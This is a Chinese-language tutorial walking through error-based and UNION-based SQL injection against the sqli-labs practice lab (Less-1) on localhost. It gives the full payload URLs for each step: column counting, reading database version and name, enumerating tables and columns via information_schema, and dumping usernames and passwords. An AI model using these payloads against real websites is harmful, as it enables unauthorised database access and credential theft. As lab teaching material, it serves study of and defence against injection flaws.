# 基本步骤
1. 判断是什么类型注入，有没有过滤关键字，是否能绕过
2. 确定存在注入的表的列数以及表中数据那些字段可以显示出来
3. 获取数据库版本，用户，当前连接的数据库等信息
4. 获取数据库中所有表的信息
5. 获取某个表的列字段信息
5. 获取相应表的数据

## 基于错误的GET单引号字符型注入
### 1.  一般判断是否存在基于错误的盲注和显错注入，可以使用以下方法：
**单引号， and 1=1 ，and 1=2 ，双引号，反斜杠，注释等**

输入单引号，有报错信息，说明存在注入，没有过滤单引号(单引号被url编码)
```
http://127.0.0.1/sqli/Less-1/?id=2%27
```
**You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''2'' LIMIT 0,1' at line 1**

此时的注入语句为：
```SQL
SELECT * FROM users WHERE id='2'' LIMIT 0,1 （报单引号不匹配的错）
```

为了让单引号闭合，可以使用注释符，将多余的单引号注释掉

注释符常用的有两种:
- -- ' 一定要注意在最后一个单引号前面有空格
- #


### 2. 确定表的列数（总共的字段数）
**由于接下来要采用union探测内容，而union的规则是必须要求列数相同才能正常展示，因此必须要探测列数，保证构造的注入查询结果与元查询结果列数与数据类型相同；**
```
http://127.0.0.1/sqli/Less-1/?id=2 order by 1
```
‘order by 1’代表按第一列升序排序，若数字代表的列不存在，则会报错，由此可以探测出有多少列。

当试到'4'时，出现报错信息，可以知道该表有3列：
  **Unknown column '4' in 'order clause'**
执行的sql语句是:
```sql
SELECT * FROM users WHERE id='2' order by 4 -- '' LIMIT 0,1
```

### 3. 确定字段的显示位
- 显示位：表中数据第几位的字段可以显示，因为并不是所有的查询结果都会展示在页面中，因此需要探测页面
中展示的查询结果是哪一列的结果
- ‘union select 1,2,3 – ’ 通过显示的数字可以判断那些字段可以显示出来。
```
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,3 -- '
```

可见2,3所在的字段可以显示
> ps:id=-1,使用-1是为了使前一个sql语句所选的内容为空，从而便于后面的select语句显示信息


### 4. 获取当前数据库信息

现在只有两个字段可以显示信息，显然在后面的查询数据中，两个字段是不够用，可以使用group_concat()函数（可以把查询出来的多行数据连接起来在一个字段中显示）

- database()函数：查看当前数据库名称
- version()函数：查看数据库版本信息
- user():返回当前数据库连接使用的用户
- char():将十进制ASCII码转化成字符，以便于分隔每个字段的内容
```
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,group_concat(database(),version()),3 -- '

  Your Login name:security5.5.53
  Your Password:3
```

可以知道当前
数据库名为security，数据库版本为5.5.53

### 5. 获取全部数据库信息
Mysql有一个系统的数据库**information_schema**,里面保存着所有数据库的相关信息，使用该表完成注入
```
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,group_concat(char(32),schema_name,char(32)),3 from information_schema.schemata -- '
```
获取到了所有的数据库信息 information_schema ,security

#### 获取security数据库中的表信息
```
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,group_concat(char(32),table_name,char(32)),3 from information_schema.tables where table_schema='security' -- '

Your Login name: emails , referers , uagents , users 
Your Password:3
```
> ps:table_schema= '数据库的名'

#### 获取users表的列
```
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,group_concat(char(32),column_name,char(32)),3 from information_schema.columns where table_name='users' -- '

 Your Login name: user_id , first_name , last_name , user , password , avatar , last_login , failed_login , id , username , password
 Your Password:3
 ```

执行的sql语句是:

```sql
SELECT * FROM users WHERE id='-1' union select 1,group_concat(char(32),column_name,char(32)),3 from information_schema.columns where table_name='users' -- '' LIMIT 0,1
```

#### 获取数据
```
http://127.0.0.1/sqli/Less-1/?id=-1' union select 1,group_concat(char(32),username,char(32),password),3 from users -- '
 Your Login name: Dumb Dumb, Angelina I-kill-you, Dummy p@ssword, secure crappy, stupid stupidity, superman genious, batman mob!le, admin admin, admin1 admin1, admin2 admin2, admin3 admin3, dhakkan dumbo, admin4 admin4
 Your Password:3
 ```
执行的sql语句是:
```sql
SELECT * FROM users WHERE id='-1' union select 1,group_concat(char(32),username,char(32),password),3 from users -- '' LIMIT 0,1
```
